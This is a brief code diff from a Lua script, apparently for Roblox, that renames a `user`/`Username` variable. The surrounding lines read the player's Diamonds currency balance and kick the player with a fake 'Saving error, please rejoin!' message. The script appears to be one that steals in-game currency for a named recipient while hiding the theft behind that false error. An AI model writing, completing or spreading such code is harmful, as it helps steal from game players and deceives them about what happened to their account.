@@ -24,7 +24,8 @@ if GemAmount1 < 10000 then
     plr:kick("Saving error, please rejoin! Source code by .t.ob.i.")
 end
 
-local user = username
+local user = Username
+
 local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
 local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
 gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
